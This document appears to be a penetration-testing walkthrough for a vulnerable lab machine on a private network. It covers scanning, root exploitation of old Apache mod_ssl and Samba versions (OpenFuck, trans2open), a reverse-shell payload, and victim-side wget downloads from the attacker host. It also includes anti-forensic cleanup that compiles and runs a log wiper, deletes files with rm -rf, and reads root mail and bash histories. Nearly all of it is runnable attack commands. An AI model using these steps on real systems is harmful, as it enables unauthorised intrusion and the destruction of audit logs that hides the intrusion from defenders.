
### Network Configuration
```
--------------------         ------------------
|                  |---------|     Attacker   |
|      Router      |         |  192.168.50.6  |
|                  |         ------------------
|                  |         ------------------
|   192.168.50.1   |---------|     Victim     |
|                  |         |  192.168.50.4  |
--------------------         ------------------
```

1. Enumeration
```
nmap -n -sn -vvv 192.168.50.0-255
nmap -vvv -A -oA 192.168.50.4 192.168.50.4
nmap -T4 192.168.50.4 -sV -O  
nmap -T4 -O -sV -sS 192.168.50.4

nbtscan 192.168.50.4

enum4linux 192.168.50.4  

nikto -host 192.168.50.4 -port 80,443
```
2. Exploitation

Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow

https://www.exploit-db.com/exploits/764/
```
cp /usr/share/exploitdb/exploits/unix/remote/764.c ~/OpenFuck.c
```
> http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/
```
apt-get install libssl-dev

apt-get install libssl1.0-dev  <=  IMPORTANT
```
http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c

```
cp ~/Downloads/ptrace-kmod.c /var/www/html/
service apache2 start
```
"OpenFuck.c" =>  wget http://192.168.50.6/ptrace-kmod.c
```
gcc OpenFuck.c -o exploit -lcrypto
```
Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
```
./exploit | grep "1.3.20"

./exploit 0x6a 192.168.50.4 443
./exploit 0x6b 192.168.50.4 443 -c 50

id

cat /var/mail/root
```
-------
```
use auxiliary/scanner/smb/smb_version
```
(Samba 2.2.1a)

Google for “Samba 2.2.1a vulnerability”

https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open
```
use exploit/linux/samba/trans2open
set payload generic/shell_reverse_tcp
```
Samba < 2.2.8 (Linux/BSD) - Remote Code Execution

https://www.exploit-db.com/exploits/10/
```
wget https://www.exploit-db.com/download/10.c

gcc 10.c -o samba

./samba

./samba -b 0 -c 192.168.50.6 192.168.50.4

uname -a && whoami
```
-------

Cleanup after pwning linux system

http://garage4hackers.com/showthread.php?t=6901

Victim
```
cd /var/log && grep -r 192.168.50.6 ./
```
Attacker

https://packetstormsecurity.com/files/31345/0x333shadow.tar.gz.html
```
cp ~/Downloads/0x333shadow.tar.gz ~
tar xvf 0x333shadow.tar.gz
cp 0x333shadow/0x333shadow.c /var/www/html/rmLogs.c
```
Victim
```
cd /tmp
wget 192.168.50.6/rmLogs.c
gcc rmLogs.c -o rmLogs -D Linux

./rmLogs

./rmLogs -a -i 192.168.50.6 -l 5 && rm -rf *

cd /var/log && grep -r 192.168.50.6 ./

locate .bash_history
cat /home/john/.bash_history
cat /root/.bash_history

uname -a && whoami
```
